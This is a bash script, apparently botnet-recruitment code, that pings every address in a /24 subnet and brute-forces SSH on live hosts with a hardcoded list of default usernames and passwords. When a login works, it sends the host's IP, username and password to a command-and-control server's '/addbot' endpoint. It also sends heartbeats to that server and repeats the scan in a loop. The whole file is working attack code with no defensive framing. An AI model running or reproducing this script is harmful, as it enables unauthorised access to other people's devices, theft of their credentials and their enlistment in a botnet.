#!/bin/bash

source ./.config

val=""
val=$(grep -E "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" <<< $destIP)
ip=$(grep -ohE "([0-9]{1,3}\.){3}" <<< $destIP)
echo $ip
if [[ $val == "" ]]
then
	echo " enter a valid IP address"
	echo "please enter the IP ID in the form of x.x.x"
        echo "this program handles only /24 subnet values"
	exit
else
	echo "trying with $ip 0/24"
fi

# brute force try to ssh into the machine main function
sshTry()
{
	declare -a usernames=( "666666" "satya" "888888" "admin" "admin" "admin" "admin" "admin" "admin" "admin" "pi" "NA" )
	declare -a passwords=( "666666" "satya" "888888" "" "1111" "1111111" "1234" "admin1234" "12345" "123456" "123456789" "NA" )
	
	uname=""
	pass=""

	for i in {0..11};
	do
		trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";return' INT
		uname=${usernames[i]}
		pass=${passwords[i]}
		# echo "trying $uname and $pass."
		sshpass -p "$pass" ssh -oStrictHostKeyChecking=no $uname@$1 "exit;" &>/dev/null
		if [ $? -eq 0 ]
		then
			echo "Username : $uname Password : $pass"
			break
		fi
	done 
	val=$1,$uname,$pass
	echo $val
	if [[ $uname == "NA" ]]
	then
		echo "user name and password not found for $1"
	else
		curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc:$port/addbot
		echo "$val added"
	fi
}

# Scan network helper
is_alive_ping()
{
	curl --request GET http://$cnc:$port/heartbeatbot
	ping -c 1 $1 > /dev/null
	if [ $? -eq 0 ]
	then
		echo "Brute forcing the device with IP $1"
		sshTry $1
	fi
}

# scan network main 
nwscan()
{
	for i in $1{2..254}
	do
		# is_alive_ping $i & disown
		is_alive_ping $i
	done
}

n=1
while (($n <=5 ))
do
	trap 'echo ""; echo"" ;echo "Terminated by the user"; echo"";echo "exiting this $1";exit 0' INT
	echo ""
	echo "Scanning the Network"
	nwscan $ip
	echo "about to retart in few seconds"
	sleep 10
done
